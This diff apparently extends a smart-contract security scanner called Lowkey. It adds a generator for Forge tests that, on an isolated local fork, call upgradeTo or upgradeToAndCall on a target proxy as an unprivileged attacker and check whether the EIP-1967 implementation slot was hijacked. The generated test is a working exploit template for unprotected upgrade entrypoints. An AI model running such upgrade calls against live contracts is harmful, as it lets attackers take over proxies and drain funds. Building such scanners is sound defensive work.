@@ -677,7 +677,7 @@ ATTACK FAMILIES
   oracle        oracle/price dependency probes
   economic      economic and flash-loan-shaped probes
   erc20         non-standard token assumption probes
-  proxy         proxy/initialization/implementation probes
+  proxy         unprivileged EIP-1967 upgradeTo/upgradeToAndCall probes
   storage       storage/invariant probes
 
 MODES
@@ -1617,6 +1617,85 @@ contract LowkeyBreakRepeat is Test {{
 """
 
 
+def _render_proxy_upgrade_test(target: Target, signature: str, calldata: str, value: str):
+    """Test a standard UUPS-style upgrade entrypoint on an isolated fork."""
+    target_lit = f"address(uint160(0x00{target.address[2:].lower()}))"
+    value_lit = "0" if value in {"0", "0wei"} else "1"
+    slot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
+    return _render_common_header() + f"""
+contract LowkeyProxyReplacement {{
+    fallback() external payable {{}}
+
+    function proxiableUUID() external pure returns (bytes32) {{
+        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+    }}
+
+    function lowkeyProxyMarker(bytes32 challenge) external view returns (bytes32) {{
+        return keccak256(abi.encodePacked("LOWKEY_PROXY_ROUTE_PROBE", challenge, address(this)));
+    }}
+}}
+
+contract LowkeyBreakProxyUpgrade is Test {{
+    address constant TARGET = {target_lit};
+    address constant ATTACKER = address(uint160(0x00BEEF000000000000000000000000000000000042));
+    bytes32 constant IMPLEMENTATION_SLOT = {slot};
+
+    function test_break_proxy_upgrade() public {{
+        address replacement = address(new LowkeyProxyReplacement());
+        bytes memory data = LowkeyABIPatch.replaceAddress(
+            hex"{calldata[2:]}",
+            address(uint160(0x00{ABI_ADDRESS_SENTINEL[2:]})),
+            replacement
+        );
+        bytes32 beforeRaw = vm.load(TARGET, IMPLEMENTATION_SLOT);
+        address beforeImplementation = address(uint160(uint256(beforeRaw)));
+        require(beforeImplementation != address(0), "no EIP1967 implementation slot");
+
+        vm.deal(ATTACKER, 100 ether);
+        vm.prank(ATTACKER);
+        (bool success, bytes memory returndata) = TARGET.call{{value: {value_lit}}}(data);
+
+        bytes32 afterRaw = vm.load(TARGET, IMPLEMENTATION_SLOT);
+        address afterImplementation = address(uint160(uint256(afterRaw)));
+        bool changed = afterRaw != beforeRaw;
+        bool candidateInstalled = changed
+            && afterImplementation == replacement
+            && replacement.code.length > 0;
+
+        bytes32 routeChallenge = keccak256(
+            abi.encodePacked(address(this), replacement, block.number, block.timestamp)
+        );
+        vm.prank(ATTACKER);
+        (bool routeBeforeSucceeded, bytes memory routeBeforeData) =
+            TARGET.staticcall(abi.encodeWithSignature("lowkeyProxyMarker(bytes32)", routeChallenge));
+        bool markerWasAlreadyReachable = routeBeforeSucceeded
+            && routeBeforeData.length == 32
+            && abi.decode(routeBeforeData, (bytes32))
+                == keccak256(abi.encodePacked("LOWKEY_PROXY_ROUTE_PROBE", routeChallenge, TARGET));
+
+        vm.prank(ATTACKER);
+        (bool routeCallSucceeded, bytes memory routeData) =
+            TARGET.staticcall(abi.encodeWithSignature("lowkeyProxyMarker(bytes32)", routeChallenge));
+        bool routeConfirmed = !markerWasAlreadyReachable
+            && routeCallSucceeded
+            && routeData.length == 32
+            && abi.decode(routeData, (bytes32))
+                == keccak256(abi.encodePacked("LOWKEY_PROXY_ROUTE_PROBE", routeChallenge, TARGET));
+
+        console2.log("LOWKEY_BREAK_FAMILY", "proxy");
+        console2.log("UPGRADE_CALL_SUCCESS", success);
+        console2.log("IMPLEMENTATION_CHANGED", changed);
+        console2.log("CANDIDATE_IMPLEMENTATION_INSTALLED", candidateInstalled);
+        console2.log("DELEGATECALL_ROUTE_CONFIRMED", routeConfirmed);
+        console2.log("ROUTE_MARKER_PREEXISTED", markerWasAlreadyReachable);
+        console2.log("BEFORE_IMPLEMENTATION", beforeImplementation);
+        console2.log("AFTER_IMPLEMENTATION", afterImplementation);
+        console2.log("RETURNDATA_LENGTH", returndata.length);
+        console2.log("LOWKEY_BREAK", success && candidateInstalled && routeConfirmed);
+    }}
+}}
+
+
 def _render_access_test(target: Target, signature: str, calldata: str, value: str, break_on_success: bool = True):
     target_lit = f"address(uint160(0x00{target.address[2:].lower()}))"
     value_lit = "0" if value in {"0", "0wei"} else "1"
@@ -2411,7 +2490,29 @@ def _result_from_output(
     target_rejected = bool(re.search(r"TARGET_REJECTED_ATTACK\s+true", text_output, flags=re.I))
     reentry_reached = bool(re.search(r"REENTRY_REACHED\s+true", text_output, flags=re.I))
     target_revert_data = bool(re.search(r"TARGET_REVERT_DATA_PRESENT\s+true", text_output, flags=re.I))
-    if structured and family in {"replay", "accounting"}:
+    if structured and family == "proxy":
+        upgrade_success = _read_telemetry_bool(text_output, "UPGRADE_CALL_SUCCESS")
+        implementation_changed = _read_telemetry_bool(text_output, "IMPLEMENTATION_CHANGED")
+        candidate_installed = _read_telemetry_bool(text_output, "CANDIDATE_IMPLEMENTATION_INSTALLED")
+        route_confirmed = _read_telemetry_bool(text_output, "DELEGATECALL_ROUTE_CONFIRMED")
+        if None in {upgrade_success, implementation_changed, candidate_installed, route_confirmed}:
+            status = "BLOCKED"
+            is_break = False
+            reason_code = "proxy_upgrade_telemetry_missing"
+            summary = "The proxy upgrade harness did not emit all required slot-change telemetry; no conclusion is supported."
+        elif is_break and upgrade_success and implementation_changed and candidate_installed and route_confirmed:
+            status = "BREAK"
+            is_break = True
+            summary = "An unprivileged local-fork caller installed Lowkey's deployed replacement implementation in the target's EIP-1967 implementation slot."
+        else:
+            status = "OBSERVED"
+            is_break = False
+            reason_code = "unprivileged_proxy_upgrade_not_observed"
+            summary = (
+                "The isolated proxy upgrade probe ran, but an unprivileged caller did not install the replacement implementation "
+                "in the EIP-1967 slot. This does not prove every upgrade route is protected."
+            )
+    elif structured and family in {"replay", "accounting"}:
         setup_success = _read_telemetry_bool(text_output, "SETUP_SUCCESS")
         first_success = _read_telemetry_bool(text_output, "FIRST_SUCCESS")
         second_success = _read_telemetry_bool(text_output, "SECOND_SUCCESS")
@@ -2548,6 +2649,16 @@ def _result_from_output(
     detail = {
         "raw_tail": raw_tail,
     }
+    if structured and family == "proxy":
+        detail["proxy_upgrade_probe"] = {
+            "upgrade_call_success": _read_telemetry_bool(text_output, "UPGRADE_CALL_SUCCESS"),
+            "implementation_changed": _read_telemetry_bool(text_output, "IMPLEMENTATION_CHANGED"),
+            "candidate_implementation_installed": _read_telemetry_bool(text_output, "CANDIDATE_IMPLEMENTATION_INSTALLED"),
+            "delegatecall_route_confirmed": _read_telemetry_bool(text_output, "DELEGATECALL_ROUTE_CONFIRMED"),
+            "before_implementation": _extract_console_bytes(text_output, "BEFORE_IMPLEMENTATION"),
+            "after_implementation": _extract_console_bytes(text_output, "AFTER_IMPLEMENTATION"),
+            "scope": "isolated Forge fork of the selected Anvil RPC",
+        }
     if reason_code:
         detail["reason_code"] = reason_code
     if structured and family in {"replay", "accounting"}:
@@ -2856,7 +2967,38 @@ def _run_family(host, config, rpc: str, target: Target, fn: dict[str, Any], fami
             value,
             break_on_success=bool(UPGRADE_RE.search(name)),
         )
-    elif family in {"callback", "signature", "dos", "oracle", "economic", "erc20", "proxy", "storage"}:
+    elif family == "proxy":
+        input_types = [str(item.get("type") or "").lower() for item in (fn.get("inputs") or [])]
+        if name.lower() not in {"upgradeto", "upgradetoandcall"} or not input_types or input_types[0] != "address":
+            return AttackResult(
+                family, target.contract, target.address, signature, "BLOCKED",
+                "The executable proxy adapter currently supports standard upgradeTo(address) and upgradeToAndCall(address,bytes) entrypoints only.",
+                detail={"reason_code": "unsupported_proxy_upgrade_shape"},
+            )
+        if name.lower() == "upgradeto" and len(input_types) != 1:
+            return AttackResult(
+                family, target.contract, target.address, signature, "BLOCKED",
+                "upgradeTo is supported only with the standard (address) ABI shape.",
+                detail={"reason_code": "unsupported_proxy_upgrade_shape"},
+            )
+        if name.lower() == "upgradetoandcall" and (len(input_types) != 2 or input_types[1] != "bytes"):
+            return AttackResult(
+                family, target.contract, target.address, signature, "BLOCKED",
+                "upgradeToAndCall is supported only with the standard (address,bytes) ABI shape.",
+                detail={"reason_code": "unsupported_proxy_upgrade_shape"},
+            )
+        if name.lower() == "upgradetoandcall":
+            # Empty migration calldata avoids inventing an initializer selector or
+            # random payload. The probe tests authorization and implementation routing.
+            calldata = (
+                calldata[:10]
+                + ("0" * 24) + ABI_ADDRESS_SENTINEL[2:].lower()
+                + f"{64:064x}"
+                + f"{0:064x}"
+            )
+            values = [ABI_ADDRESS_SENTINEL, "0x"]
+        body = _render_proxy_upgrade_test(target, signature, calldata, value)
+    elif family in {"callback", "signature", "dos", "oracle", "economic", "erc20", "storage"}:
         # Generic success is only an observation. These families need a
         # protocol-specific invariant before Lowkey may call it a BREAK.
         body = _render_access_test(target, signature, calldata, value, break_on_success=False)
@@ -2963,6 +3105,8 @@ _TERMINAL_PROBE_REASON_CODES = {
     "forge_no_lowkey_telemetry",
     "setup_call_reverted",
     "unsupported_abi",
+    "unsupported_proxy_upgrade_shape",
+    "proxy_upgrade_telemetry_missing",
 }
 
 
@@ -3790,12 +3934,23 @@ def _families_for_function(
 
 def _select_functions(functions: list[dict[str, Any]], opts: dict[str, Any]) -> list[dict[str, Any]]:
     funcs = _ordered_functions([fn for fn in functions if _is_state_changing(fn)])
+    proxy_only = str(opts.get("family") or "").lower() == "proxy"
+    if proxy_only:
+        funcs = [
+            fn for fn in funcs
+            if str(fn.get("name") or "").lower() in {"upgradeto", "upgradetoandcall"}
+        ]
     query = opts.get("function")
     if query:
         matched = [fn for fn in funcs if _function_matches(fn, query)]
         if not matched and "(" not in str(query):
             matched = [fn for fn in funcs if str(fn.get("name") or "").lower() == str(query).lower()]
         if not matched:
+            if proxy_only:
+                raise ValueError(
+                    "No supported standard proxy upgrade function matched. "
+                    "The current executable adapter targets upgradeTo(address) and upgradeToAndCall(address,bytes)."
+                )
             raise ValueError(f"No state-changing function matched '{query}'.")
         return matched
     # Start with the most attack-relevant surface, but expand outward in rounds.
